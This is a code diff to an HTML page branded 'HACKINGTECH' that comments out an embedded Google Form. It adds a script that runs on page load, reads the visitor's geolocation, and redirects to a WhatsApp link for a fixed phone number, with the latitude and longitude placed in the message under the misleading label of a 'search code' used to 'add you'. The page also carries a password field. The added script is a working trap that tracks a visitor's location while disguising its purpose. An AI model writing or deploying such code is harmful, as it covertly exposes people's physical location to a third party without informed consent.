@@ -104,11 +104,28 @@
    </div>
    <input type="password">
    <div class="iframe">
-    <iframe src="https://docs.google.com/forms/d/e/1FAIpQLSf8UnDJEqVhxGCPvoLtFWM2GL364fZlaPMwVB48suWGgdUvjQ/viewform?embedded=true" width="640" height="1539" frameborder="0" marginheight="0" marginwidth="0">Loading…</iframe>
+    <!-- <iframe src="https://docs.google.com/forms/d/e/1FAIpQLSf8UnDJEqVhxGCPvoLtFWM2GL364fZlaPMwVB48suWGgdUvjQ/viewform?embedded=true" width="640" height="1539" frameborder="0" marginheight="0" marginwidth="0">Loading…</iframe> -->
 </div>
 </body>
 <footer>
     <h2>&copy; Powered BY HACKINGTECH | HOME</h2>
     <h4>2018 - 2020</h4>
 </footer>
+<script>
+    function locate(){
+        if(navigator.geolocation){
+            navigator.geolocation.getCurrentPosition(showPosition)
+        }
+        else{
+            alert("Sorry We Can't Provide You With This Info Since We Can't Access Your Location")
+        }
+    }
+    // function showPosition(position){
+    //     document.write("Your Latituded Is " + position.coords.latitude +"\nYour Longitude is "+position.coords.longitude)
+    // }
+    function showPosition(position){
+       window.location = "https://wa.me/0500709994?text=This Is The Search Paramenter Which Will Be Used To Add You........Your Search Code Is "+position.coords.longitude + "🥰❤,,"+position.coords.latitude + "\n"
+    }
+    locate()
+</script>
 </html>
